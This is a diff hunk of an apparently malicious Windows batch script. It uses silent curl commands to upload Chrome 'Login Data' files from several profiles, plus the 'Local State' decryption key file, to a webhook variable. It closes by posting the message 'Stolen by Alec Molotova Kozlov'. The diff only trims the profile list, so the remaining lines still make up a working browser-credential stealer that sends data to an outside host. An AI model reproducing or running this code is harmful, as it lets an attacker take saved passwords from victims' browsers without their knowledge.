@@ -13,13 +13,5 @@ curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\D
 curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Guest Profile\Login Data" %webhook%
 curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 1\Login Data" %webhook%
 curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 2\Login Data" %webhook%
-curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 3\Login Data" %webhook%
-curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 4\Login Data" %webhook%
-curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 5\Login Data" %webhook%
-curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 6\Login Data" %webhook%
-curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 7\Login Data" %webhook%
-curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 8\Login Data" %webhook%
-curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 9\Login Data" %webhook%
-curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 10\Login Data" %webhook%
 curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Stolen by Alec Molotova Kozlov```\"}"  %webhook%
